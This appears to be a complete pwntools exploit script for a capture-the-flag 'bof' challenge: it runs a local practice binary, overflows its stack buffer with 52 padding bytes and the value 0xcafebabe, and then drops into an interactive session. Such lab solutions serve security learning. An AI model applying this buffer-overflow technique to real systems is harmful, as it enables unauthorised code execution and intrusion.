from pwn import *
context.log_level = 'DEBUG'
con = process('./2-bof/bof')
con.sendline("aaaa"*13+p32(0xcafebabe))
con.interactive()
